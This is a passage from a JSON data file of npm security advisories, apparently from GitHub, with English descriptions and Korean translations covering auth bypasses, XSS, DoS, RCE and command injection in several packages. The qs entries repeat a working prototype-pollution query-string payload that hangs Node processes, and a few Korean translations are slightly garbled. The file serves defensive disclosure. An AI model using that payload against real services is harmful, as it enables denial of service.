    "references": "https://github.com/auth0/passport-wsfed-saml2/security/advisories/GHSA-ppjq-qxhx-m25f\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-23505\nhttps://github.com/auth0/passport-wsfed-saml2/pull/179\nhttps://github.com/advisories/GHSA-ppjq-qxhx-m25f",
    "name": "passport-wsfed-saml2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.6.3",
    "identifier": "4.6.3",
    "descriptionKR": "# 개요\n원격 공격자는 passport-wsfed-saml2를 사용하여 웹 사이트에서 WSFed 인증을 우회할 수 있습니다. 공격이 성공하려면 공격자가 임의의 IDP 서명 WSFed 어설션을 소유하고 있어야 합니다. 사용된 IDP에 따라 서명된 메시지 생성이 트리거될 수 있는 경우 완전히 인증되지 않은 공격(예: 유효한 사용자에 대한 액세스 권한 없음)도 가능할 수 있습니다.\n\n# 영향을 받나요?\npassport-wsfed-saml2 라이브러리 버전이 4.6.3 미만인 WSFed 프로토콜을 사용하는 경우 영향을 받습니다.\nSAML2 프로토콜은 영향을 받지 않습니다.\n\n# 어떻게 고칠 수 있나요?\n라이브러리를 버전 4.6.3으로 업그레이드하십시오.\n\n# 수정 사항이 내 사용자에게 영향을 미칩니까?\n아니요, 수정 사항은 사용자에게 영향을 미치지 않습니다."
  },
  {
    "description": "## Duplicate advisory\nThis advisory has been withdrawn because it is a duplicate of [GHSA-crh5-vv2v-c82q](https://github.com/advisories/GHSA-crh5-vv2v-c82q). This link is maintained to preserve external references.\n\n## Original Description\nA vulnerability was found in claviska jquery-minicolors up to 2.3.5. It has been rated as problematic. Affected by this issue is some unknown functionality of the file jquery.minicolors.js. The manipulation leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 2.3.6 is able to address this issue. The name of the patch is ef134824a7f4110ada53ea6c173111a4fa2f48f3. It is recommended to upgrade the affected component. VDB-215306 is the identifier assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-vc9x-gmmr-p7jj\nCVE : CVE-2021-4243",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T00:11:58Z",
    "publishedAt": "2022-12-12T15:30:31Z",
    "withdrawnAt": "2023-02-22T00:11:56Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4243\nhttps://github.com/claviska/jquery-minicolors/commit/ef134824a7f4110ada53ea6c173111a4fa2f48f3\nhttps://github.com/claviska/jquery-minicolors/releases/tag/2.3.6\nhttps://vuldb.com/?id.215306\nhttps://codepen.io/webbiesdk/pen/oNBQNNV\nhttps://securitylab.github.com/advisories/GHSL-2021-1045_jQuery_MiniColors_Plugin/\nhttps://vuldb.com/?ctiid.215306\nhttps://github.com/advisories/GHSA-vc9x-gmmr-p7jj",
    "name": "@claviska/jquery-minicolors",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.3.6",
    "identifier": "2.3.6",
    "descriptionKR": "## 중복 권고\n이 권고는 [GHSA-crh5-vv2v-c82q](https://github.com/advisories/GHSA-crh5-vv2v-c82q)와 중복되기 때문에 철회되었습니다. 이 링크는 외부 참조를 보존하기 위해 유지됩니다.\n\n## 원본 설명\n2.3.5까지의 claviska jquery-minicolors에서 취약점이 발견되었습니다. 문제가 있는 것으로 평가되었습니다. 이 문제의 영향을 받는 것은 jquery.minicolors.js 파일의 일부 알려지지 않은 기능입니다. 조작은 교차 사이트 스크립팅으로 이어집니다. 공격은 원격으로 시작할 수 있습니다. 익스플로잇은 대중에게 공개되었으며 사용될 수 있습니다. 버전 2.3.6으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 ef134824a7f4110ada53ea6c173111a4fa2f48f3입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. VDB-215306은 이 취약점에 할당된 식별자입니다."
  },
  {
    "description": "### Impact\nAll authenticated Cube clients could bypass row-level security and run arbitrary SQL via the newly introduced /v1/sql-runner endpoint.\n\n### Patches\nThe change has been reverted in 0.31.24\n\n### Workarounds\nUpgrade to >=0.31.24 or downgrade to <=0.31.22\n\n### Post mortem\nAs part of implementing the Cube Cloud SQL runner functionality, we’ve added a new endpoint to the Cube Core so that we could add arbitrary queries directly to the queue, bypassing the modeling layer.\n\nThe endpoint was added in this commit: https://github.com/cube-js/cube.js/commit/f1e25bb50323c0b99f3891d349467e7b637baeea\n\nIt went through the code review; however, it slipped everyone’s attention that this endpoint completely bypasses any row-level security logic implemented in the modeling layer. Now anyone with a valid Cube JWT token could fetch any data, even if they were not allowed to do so by their security context.\n\nThe issue was noticed by the Core team on Dec 12 and immediately reverted.\n\nThe just-released 0.31.23 version of the Cube has been pulled out of all the registries, and a CVE was published on Github.\nAnother change (https://github.com/cube-js/cube.js/commit/2c5db32f2ded074ebe5e83668eee8c024101240b) was also rolled back along with the SQL runner endpoint. It didn't pose a significant security threat, but it increased the attacker’s ability to enumerate cube schema, and it should be revisited.\n\nThe 0.31.24 was released to replace the revoked version with a change completely reverted. All customers are urged to upgrade to the newest Cube version.\n",
    "identifiers": "GHSA : GHSA-6jqm-3c9g-pch7\nCVE : CVE-2022-23510",
    "severity": "HIGH",
    "updatedAt": "2023-01-28T05:05:28Z",
    "publishedAt": "2022-12-12T21:28:35Z",
    "references": "https://github.com/cube-js/cube.js/security/advisories/GHSA-6jqm-3c9g-pch7\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-23510\nhttps://github.com/cube-js/cube.js/commit/3c614674fed6ca17df08bbba8c835ef110167570\nhttps://github.com/cube-js/cube.js/commit/f1140de508e359970ac82b50bae1c4bf152f6041\nhttps://github.com/advisories/GHSA-6jqm-3c9g-pch7",
    "name": "@cubejs-backend/api-gateway",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.31.23",
    "identifier": "0.31.24",
    "descriptionKR": "### 영향\n인증된 모든 Cube 클라이언트는 행 수준 보안을 우회하고 새로 도입된 /v1/sql-runner 엔드포인트를 통해 임의의 SQL을 실행할 수 있습니다.\n\n### 패치\n변경 사항은 0.31.24에서 되돌렸습니다.\n\n### 해결 방법\n>=0.31.24로 업그레이드하거나 <=0.31.22로 다운그레이드\n\n### 사후 부검\nCube Cloud SQL 실행기 기능 구현의 일환으로 Cube Core에 새 끝점을 추가하여 모델링 계층을 우회하여 대기열에 직접 임의의 쿼리를 추가할 수 있습니다.\n\n이 커밋에 엔드포인트가 추가되었습니다.\n\n코드 검토를 거쳤습니다. 그러나 이 엔드포인트가 모델링 계층에 구현된 모든 행 수준 보안 논리를 완전히 우회한다는 사실이 모든 사람의 주의를 끌었습니다. 이제 유효한 Cube JWT 토큰이 있는 사람은 누구나 보안 컨텍스트에서 허용되지 않은 경우에도 모든 데이터를 가져올 수 있습니다.\n\n이 문제는 12월 12일 Core 팀에서 발견되었으며 즉시 복구되었습니다.\n\n방금 릴리스된 큐브의 0.31.23 버전이 모든 레지스트리에서 제거되었으며 CVE가 Github에 게시되었습니다.\n또 다른 변경 사항(https://github.com/cube-js/cube.js/commit/2c5db32f2ded074ebe5e83668eee8c024101240b)도 SQL 실행기 끝점과 함께 롤백되었습니다. 심각한 보안 위협은 아니지만 큐브 스키마를 열거하는 공격자의 능력을 증가시켰으므로 재검토해야 합니다.\n\n0.31.24는 취소된 버전을 완전히 되돌린 변경 사항으로 대체하기 위해 릴리스되었습니다. 모든 고객은 최신 Cube 버전으로 업그레이드할 것을 권장합니다."
  },
  {
    "description": "### Impact\nA cross-site scripting (XSS) vulnerability was discovered in the alert and confirm dialogs when these dialogs were provided with malicious HTML content. This can occur in plugins that use the alert or confirm dialogs, such as in the `image` plugin, which presents these dialogs when certain errors occur. The vulnerability allowed arbitrary JavaScript execution when an alert presented in the TinyMCE UI for the current user.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 5.10.7 and TinyMCE 6.3.1 by ensuring HTML sanitization was still performed after unwrapping invalid elements.\n\n### Fix\nTo avoid this vulnerability:\n- Upgrade to TinyMCE 5.10.7 or higher for TinyMCE 5.x.\n- Upgrade to TinyMCE 6.3.1 or higher for TinyMCE 6.x.\n\n### Workaround\nTo reduce the impact of this vulnerability:\n- Ensure the the `images_upload_handler` returns a valid value as per the images_upload_handler documentation.\n\n### References\n- https://www.tiny.cloud/docs/release-notes/release-notes5107/#securityfixes\n- https://www.tiny.cloud/docs/tinymce/6/6.3-release-notes/#security-fixes\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)\n* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)",
    "identifiers": "GHSA : GHSA-gg8r-xjwq-4w92\nCVE : CVE-2022-23494",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:05:27Z",
    "publishedAt": "2022-12-08T23:30:01Z",
    "references": "https://github.com/tinymce/tinymce/security/advisories/GHSA-gg8r-xjwq-4w92\nhttps://www.tiny.cloud/docs/release-notes/release-notes5107/#securityfixes\nhttps://www.tiny.cloud/docs/tinymce/6/6.3-release-notes/#security-fixes\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-23494\nhttps://github.com/tinymce/tinymce/commit/6923d85eba6de3e08ebc9c5a387b5abdaa21150e\nhttps://github.com/tinymce/tinymce/commit/8bb2d2646d4e1a718fce61a775fa22e9d317b32d\nhttps://www.tiny.cloud/docs/tinymce/6/file-image-upload/#images_upload_handler\nhttps://github.com/advisories/GHSA-gg8r-xjwq-4w92",
    "name": "tinymce",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.10.7",
    "identifier": "5.10.7",
    "descriptionKR": "### 영향\n이러한 대화 상자에 악의적인 HTML 콘텐츠가 제공된 경우 경고 및 확인 대화 상자에서 교차 사이트 스크립팅(XSS) 취약성이 발견되었습니다. 이는 특정 오류가 발생할 때 이러한 대화 상자를 표시하는 '이미지' 플러그인과 같이 경고 또는 확인 대화 상자를 사용하는 플러그인에서 발생할 수 있습니다. 이 취약성은 현재 사용자에 대한 TinyMCE UI에 경고가 표시될 때 임의의 JavaScript 실행을 허용했습니다.\n\n### 패치\n이 취약점은 TinyMCE 5.10.7 및 TinyMCE 6.3.1에서 유효하지 않은 요소의 래핑을 해제한 후에도 HTML 삭제가 계속 수행되도록 하여 패치되었습니다.\n\n### 고치다\n이 취약점을 방지하려면:\n- TinyMCE 5.x의 경우 TinyMCE 5.10.7 이상으로 업그레이드하십시오.\n- TinyMCE 6.x의 경우 TinyMCE 6.3.1 이상으로 업그레이드하십시오.\n\n### 해결 방법\n이 취약점의 영향을 줄이려면:\n- `images_upload_handler`가 images_upload_handler 설명서에 따라 유효한 값을 반환하는지 확인합니다.\n\n### 참조\n- https://www.tiny.cloud/docs/release-notes/release-notes5107/#securityfixes\n- https://www.tiny.cloud/docs/tinymce/6/6.3-release-notes/#security-fixes\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [infosec@tiny.cloud](mailto:infosec@tiny.cloud)로 이메일을 보내주세요.\n* [TinyMCE 저장소](https://github.com/tinymce/tinymce/issues)에서 이슈 열기"
  },
  {
    "description": "### Impact\nA cross-site scripting (XSS) vulnerability was discovered in the alert and confirm dialogs when these dialogs were provided with malicious HTML content. This can occur in plugins that use the alert or confirm dialogs, such as in the `image` plugin, which presents these dialogs when certain errors occur. The vulnerability allowed arbitrary JavaScript execution when an alert presented in the TinyMCE UI for the current user.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 5.10.7 and TinyMCE 6.3.1 by ensuring HTML sanitization was still performed after unwrapping invalid elements.\n\n### Fix\nTo avoid this vulnerability:\n- Upgrade to TinyMCE 5.10.7 or higher for TinyMCE 5.x.\n- Upgrade to TinyMCE 6.3.1 or higher for TinyMCE 6.x.\n\n### Workaround\nTo reduce the impact of this vulnerability:\n- Ensure the the `images_upload_handler` returns a valid value as per the images_upload_handler documentation.\n\n### References\n- https://www.tiny.cloud/docs/release-notes/release-notes5107/#securityfixes\n- https://www.tiny.cloud/docs/tinymce/6/6.3-release-notes/#security-fixes\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)\n* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)",
    "identifiers": "GHSA : GHSA-gg8r-xjwq-4w92\nCVE : CVE-2022-23494",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:05:27Z",
    "publishedAt": "2022-12-08T23:30:01Z",
    "references": "https://github.com/tinymce/tinymce/security/advisories/GHSA-gg8r-xjwq-4w92\nhttps://www.tiny.cloud/docs/release-notes/release-notes5107/#securityfixes\nhttps://www.tiny.cloud/docs/tinymce/6/6.3-release-notes/#security-fixes\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-23494\nhttps://github.com/tinymce/tinymce/commit/6923d85eba6de3e08ebc9c5a387b5abdaa21150e\nhttps://github.com/tinymce/tinymce/commit/8bb2d2646d4e1a718fce61a775fa22e9d317b32d\nhttps://www.tiny.cloud/docs/tinymce/6/file-image-upload/#images_upload_handler\nhttps://github.com/advisories/GHSA-gg8r-xjwq-4w92",
    "name": "tinymce",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.3.1",
    "identifier": "6.3.1",
    "descriptionKR": "### 영향\n이러한 대화 상자에 악의적인 HTML 콘텐츠가 제공된 경우 경고 및 확인 대화 상자에서 교차 사이트 스크립팅(XSS) 취약성이 발견되었습니다. 이는 특정 오류가 발생할 때 이러한 대화 상자를 표시하는 '이미지' 플러그인과 같이 경고 또는 확인 대화 상자를 사용하는 플러그인에서 발생할 수 있습니다. 이 취약성은 현재 사용자에 대한 TinyMCE UI에 경고가 표시될 때 임의의 JavaScript 실행을 허용했습니다.\n\n### 패치\n이 취약점은 TinyMCE 5.10.7 및 TinyMCE 6.3.1에서 유효하지 않은 요소의 래핑을 해제한 후에도 HTML 삭제가 계속 수행되도록 하여 패치되었습니다.\n\n### 고치다\n이 취약점을 방지하려면:\n- TinyMCE 5.x의 경우 TinyMCE 5.10.7 이상으로 업그레이드하십시오.\n- TinyMCE 6.x의 경우 TinyMCE 6.3.1 이상으로 업그레이드하십시오.\n\n### 해결 방법\n이 취약점의 영향을 줄이려면:\n- `images_upload_handler`가 images_upload_handler 설명서에 따라 유효한 값을 반환하는지 확인합니다.\n\n### 참조\n- https://www.tiny.cloud/docs/release-notes/release-notes5107/#securityfixes\n- https://www.tiny.cloud/docs/tinymce/6/6.3-release-notes/#security-fixes\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [infosec@tiny.cloud](mailto:infosec@tiny.cloud)로 이메일을 보내주세요.\n* [TinyMCE 저장소](https://github.com/tinymce/tinymce/issues)에서 이슈 열기"
  },
  {
    "description": "### Impact\nVersions older than `v0.38.0` of js-libp2p are vulnerable to targeted resource exhaustion attacks. These attacks target libp2p’s connection, stream, peer, and memory management. An attacker can cause the allocation of large amounts of memory, ultimately leading to the process getting killed by the host’s operating system. While a connection manager tasked with keeping the number of connections within manageable limits has been part of js-libp2p, this component was designed to handle the regular churn of peers, not a targeted resource exhaustion attack.\n\n### Patches (What to do as a js-libp2p consumer:)\nUpdate your js-libp2p dependency to `v0.38.0` or greater.\n\n### Workarounds\nThere are no workarounds, and so we recommend to upgrade your js-libp2p version.\nSome range of attacks can be mitigated using OS tools (like manually blocking malicious peers using iptables or ufw ) or making use of a load balancer in front of libp2p nodes.\nYou can also use the [allow deny list in js-libp2p](https://docs.libp2p.io/concepts/security/dos-mitigation/#deny-specific-peers-or-create-an-allow-list-of-trusted-peers) to deny specific peers.\n\nHowever these require direct action & responsibility on your part and are no substitutes for upgrading js-libp2p. Therefore, we highly recommend upgrading your js-libp2p version for the way it enables tighter scoped limits and provides visibility into and easier reasoning about js-libp2p resource utilization.\n\n### References\n* DoS Mitigation page for more information on how to incorporate mitigation strategies, monitor your application, and respond to attacks: https://docs.libp2p.io/reference/dos-mitigation/. \n* Documentation on how to configure limits to prevent excessive resource consumption: https://github.com/libp2p/js-libp2p/blob/master/doc/LIMITS.md\n* Documentation on how to configure metrics: https://github.com/libp2p/js-libp2p/blob/master/doc/METRICS.md\n\nPlease see the related disclosure for go-libp2p: https://github.com/libp2p/go-libp2p/security/advisories/GHSA-j7qp-mfxf-8xjw and rust-libp2p: https://github.com/libp2p/rust-libp2p/security/advisories/GHSA-jvgw-gccv-q5p8 \n\n#### For more information\n\nIf you have any questions or comments about this advisory, please email us at [security@libp2p.io](mailto:security@libp2p.io).",
    "identifiers": "GHSA : GHSA-f44q-634c-jvwv\nCVE : CVE-2022-23487",
    "severity": "HIGH",
    "updatedAt": "2023-07-14T21:52:57Z",
    "publishedAt": "2022-12-07T23:23:59Z",
    "references": "https://github.com/libp2p/js-libp2p/security/advisories/GHSA-f44q-634c-jvwv\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-23487\nhttps://github.com/advisories/GHSA-f44q-634c-jvwv",
    "name": "libp2p",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.38.0",
    "identifier": "0.38.0",
    "descriptionKR": "### 영향\njs-libp2p의 `v0.38.0` 이전 버전은 대상 자원 고갈 공격에 취약합니다. 이러한 공격은 libp2p의 연결, 스트림, 피어 및 메모리 관리를 대상으로 합니다. 공격자는 많은 양의 메모리를 할당하여 궁극적으로 호스트의 운영 체제에 의해 프로세스가 종료되도록 할 수 있습니다. 관리 가능한 한도 내에서 연결 수를 유지하는 작업을 담당하는 연결 관리자가 js-libp2p의 일부였지만 이 구성 요소는 대상 리소스 고갈 공격이 아닌 정기적인 피어 변동을 처리하도록 설계되었습니다.\n\n### 패치(js-libp2p 소비자로서 해야 할 일:)\njs-libp2p 종속성을 `v0.38.0` 이상으로 업데이트하십시오.\n\n### 해결 방법\n해결 방법이 없으므로 js-libp2p 버전을 업그레이드하는 것이 좋습니다.\n일부 범위의 공격은 OS 도구(예: iptables 또는 ufw를 사용하여 악의적인 피어를 수동으로 차단)를 사용하거나 libp2p 노드 앞에서 로드 밸런서를 사용하여 완화할 수 있습니다.\n[js-libp2p의 허용 거부 목록](https://docs.libp2p.io/concepts/security/dos-mitigation/#deny-specific-peers-or-create-an-allow-list- of-trusted-peers) 특정 피어를 거부합니다.\n\n그러나 이는 귀하의 직접적인 조치와 책임이 필요하며 js-libp2p 업그레이드를 대신할 수 없습니다. 따라서 더 엄격한 범위 제한을 지원하고 js-libp2p 리소스 활용에 대한 가시성과 더 쉬운 추론을 제공하는 방식으로 js-libp2p 버전을 업그레이드하는 것이 좋습니다.\n\n### 참조\n* 완화 전략을 통합하고 애플리케이션을 모니터링하고 공격에 대응하는 방법에 대한 자세한 내용은 DoS 완화 페이지: https://docs.libp2p.io/reference/dos-mitigation/.\n* 과도한 리소스 소비를 방지하기 위해 제한을 구성하는 방법에 대한 문서: https://github.com/libp2p/js-libp2p/blob/master/doc/LIMITS.md\n* 메트릭 구성 방법에 대한 문서: https://github.com/libp2p/js-libp2p/blob/master/doc/METRICS.md\n\ngo-libp2p: https://github.com/libp2p/go-libp2p/security/advisories/GHSA-j7qp-mfxf-8xjw 및 rust-libp2p: https://github.com/libp2p/ 관련 공개를 참조하세요. rust-libp2p/보안/권고/GHSA-jvgw-gccv-q5p8\n\n#### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있으면 [security@libp2p.io](mailto:security@libp2p.io)로 이메일을 보내주십시오."
  },
  {
    "description": "The package simple-git before 3.15.0 is vulnerable to Remote Code Execution (RCE) when enabling the `ext` transport protocol, which makes it exploitable via `clone()` method. This vulnerability exists due to an incomplete fix of [CVE-2022-24066](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-2434306).",
    "identifiers": "GHSA : GHSA-9p95-fxvg-qgq2\nCVE : CVE-2022-25912",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T22:11:36Z",
    "publishedAt": "2022-12-06T06:30:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25912\nhttps://github.com/steveukx/git-js/commit/774648049eb3e628379e292ea172dccaba610504\nhttps://github.com/steveukx/git-js/blob/main/docs/PLUGIN-UNSAFE-ACTIONS.md%23overriding-allowed-protocols\nhttps://github.com/steveukx/git-js/releases/tag/simple-git%403.15.0\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3153532\nhttps://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221\nhttps://github.com/advisories/GHSA-9p95-fxvg-qgq2",
    "name": "simple-git",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.15.0",
    "identifier": "3.15.0",
    "descriptionKR": "패키지 simple-git 3.15.0 이전은 `ext` 전송 프로토콜을 활성화할 때 원격 코드 실행(RCE)에 취약하여 `clone()` 메서드를 통해 악용할 수 있습니다. 이 취약점은 [CVE-2022-24066](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-2434306)의 불완전한 수정으로 인해 존재합니다."
  },
  {
    "description": "OS command injection vulnerability in Nadesiko3 (PC Version) v3.3.68 and earlier allows a remote attacker to execute an arbitrary OS command when processing compression and decompression on the product.\n\nRelease notes for versions 3.3.62 and 3.3.69 both link to patches for this particular issue. The [JPCERT/CC](https://jvn.jp/en/jp/JVN56968681/index.html) advisory lists versions 3.3.68 and prior as vulnerable, and the most recent patch for this issue is tagged with version 3.3.69.",
    "identifiers": "GHSA : GHSA-m8r5-7wf4-63mw\nCVE : CVE-2022-41642",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:02:50Z",
    "publishedAt": "2022-12-05T06:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-41642\nhttps://github.com/kujirahand/nadesiko3/issues/1325\nhttps://github.com/kujirahand/nadesiko3/issues/1347\nhttps://jvn.jp/en/jp/JVN56968681/index.html\nhttps://github.com/kujirahand/nadesiko3/commit/124871c064cfc65cdcd83205637e84fc246c76df\nhttps://github.com/kujirahand/nadesiko3/commit/56ccfb2f9cceaec83e6a9d3024c3ba8c54ebe1a4\nhttps://github.com/kujirahand/nadesiko3/commit/61a70792752a75b7f71df214e98a236721ea3fa6\nhttps://github.com/kujirahand/nadesiko3/releases/tag/3.3.62\nhttps://github.com/kujirahand/nadesiko3/releases/tag/3.3.69\nhttps://github.com/advisories/GHSA-m8r5-7wf4-63mw",
    "name": "nadesiko3",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 3.3.68",
    "identifier": "3.3.69",
    "descriptionKR": "Nadesiko3(PC 버전) v3.3.68 및 이전 버전의 OS 명령 주입 취약성은 원격 공격자가 제품에서 압축 및 압축 해제를 처리할 때 임의의 OS 명령을 실행할 수 있도록 허용합니다.\n\n버전 3.3.62 및 3.3.69의 릴리스 정보는 모두 이 특정 문제에 대한 패치에 연결되어 있습니다. [JPCERT/CC](https://jvn.jp/en/jp/JVN56968681/index.html) 권고에는 버전 3.3.68 이하가 취약한 것으로 나열되어 있으며 이 문제에 대한 최신 패치에는 버전 3.3 태그가 지정되어 있습니다. 69."
  },
  {
    "description": "OS command injection vulnerability in Nako3edit, editor component of nadesiko3 (PC Version) v3.3.74 and earlier allows a remote attacker to obtain appkey of the product and execute an arbitrary OS command on the product.",
    "identifiers": "GHSA : GHSA-7249-8x22-4rg4\nCVE : CVE-2022-42496",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:03:08Z",
    "publishedAt": "2022-12-05T06:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-42496\nhttps://github.com/kujirahand/nadesiko3/issues/1325\nhttps://github.com/kujirahand/nadesiko3/issues/1347\nhttps://jvn.jp/en/jp/JVN56968681/index.html\nhttps://github.com/kujirahand/nadesiko3/releases/tag/3.3.75\nhttps://github.com/advisories/GHSA-7249-8x22-4rg4",
    "name": "nadesiko3",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.3.75",
    "identifier": "3.3.75",
    "descriptionKR": "nadesiko3(PC 버전) v3.3.74 및 이전 버전의 편집기 구성 요소인 Nako3edit의 OS 명령 주입 취약성을 통해 원격 공격자가 제품의 앱 키를 획득하고 제품에서 임의의 OS 명령을 실행할 수 있습니다."
  },
  {
    "description": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
    "identifiers": "GHSA : GHSA-hrpp-h998-j3pp\nCVE : CVE-2022-24999",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T09:13:58Z",
    "publishedAt": "2022-11-27T00:30:50Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24999\nhttps://github.com/ljharb/qs/pull/428\nhttps://github.com/n8tz/CVE-2022-24999\nhttps://github.com/ljharb/qs/commit/4310742efbd8c03f6495f07906b45213da0a32ec\nhttps://github.com/ljharb/qs/commit/727ef5d34605108acb3513f72d5435972ed15b68\nhttps://github.com/ljharb/qs/commit/73205259936317b40f447c5cdb71c5b341848e1b\nhttps://github.com/ljharb/qs/commit/8b4cc14cda94a5c89341b77e5fe435ec6c41be2d\nhttps://github.com/ljharb/qs/commit/ba24e74dd17931f825adb52f5633e48293b584e1\nhttps://github.com/ljharb/qs/commit/e799ba57e573a30c14b67c1889c7c04d508b9105\nhttps://github.com/ljharb/qs/commit/ed0f5dcbef4b168a8ae299d78b1e4a2e9b1baf1f\nhttps://github.com/ljharb/qs/commit/f945393cfe442fe8c6e62b4156fd35452c0686ee\nhttps://github.com/ljharb/qs/commit/fc3682776670524a42e19709ec4a8138d0d7afda\nhttps://github.com/expressjs/express/releases/tag/4.17.3\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00039.html\nhttps://github.com/advisories/GHSA-hrpp-h998-j3pp",
    "name": "qs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.2.4",
    "identifier": "6.2.4",
    "descriptionKR": "6.10.3 이전의 qs는 `__ proto__` 키를 사용할 수 있기 때문에 공격자가 노드 프로세스를 정지시킬 수 있습니다. 많은 일반적인 웹 프레임워크 사용 사례에서 인증되지 않은 원격 공격자는 애플리케이션을 방문하는 데 사용되는 URL의 쿼리 문자열(예: `a[__proto__]=b&a[__proto__]&a[length]=100000000)에 공격 페이로드를 배치할 수 있습니다. `. 수정 사항은 qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3 및 6.2.4로 백포트되었습니다."
  },
  {
    "description": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
    "identifiers": "GHSA : GHSA-hrpp-h998-j3pp\nCVE : CVE-2022-24999",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T09:13:58Z",
    "publishedAt": "2022-11-27T00:30:50Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24999\nhttps://github.com/ljharb/qs/pull/428\nhttps://github.com/n8tz/CVE-2022-24999\nhttps://github.com/ljharb/qs/commit/4310742efbd8c03f6495f07906b45213da0a32ec\nhttps://github.com/ljharb/qs/commit/727ef5d34605108acb3513f72d5435972ed15b68\nhttps://github.com/ljharb/qs/commit/73205259936317b40f447c5cdb71c5b341848e1b\nhttps://github.com/ljharb/qs/commit/8b4cc14cda94a5c89341b77e5fe435ec6c41be2d\nhttps://github.com/ljharb/qs/commit/ba24e74dd17931f825adb52f5633e48293b584e1\nhttps://github.com/ljharb/qs/commit/e799ba57e573a30c14b67c1889c7c04d508b9105\nhttps://github.com/ljharb/qs/commit/ed0f5dcbef4b168a8ae299d78b1e4a2e9b1baf1f\nhttps://github.com/ljharb/qs/commit/f945393cfe442fe8c6e62b4156fd35452c0686ee\nhttps://github.com/ljharb/qs/commit/fc3682776670524a42e19709ec4a8138d0d7afda\nhttps://github.com/expressjs/express/releases/tag/4.17.3\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00039.html\nhttps://github.com/advisories/GHSA-hrpp-h998-j3pp",
    "name": "qs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.3.0, < 6.3.3",
    "identifier": "6.3.3",
    "descriptionKR": "6.10.3 이전의 qs는 `__ proto__` 키를 사용할 수 있기 때문에 공격자가 노드 프로세스를 정지시킬 수 있습니다. 많은 일반적인 웹 프레임워크 사용 사례에서 인증되지 않은 원격 공격자는 애플리케이션을 방문하는 데 사용되는 URL의 쿼리 문자열(예: `a[__proto__]=b&a[__proto__]&a[length]=100000000)에 공격 페이로드를 배치할 수 있습니다. `. 수정 사항은 qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3 및 6.2.4로 백포트되었습니다."
  },
  {
    "description": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
    "identifiers": "GHSA : GHSA-hrpp-h998-j3pp\nCVE : CVE-2022-24999",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T09:13:58Z",
    "publishedAt": "2022-11-27T00:30:50Z",
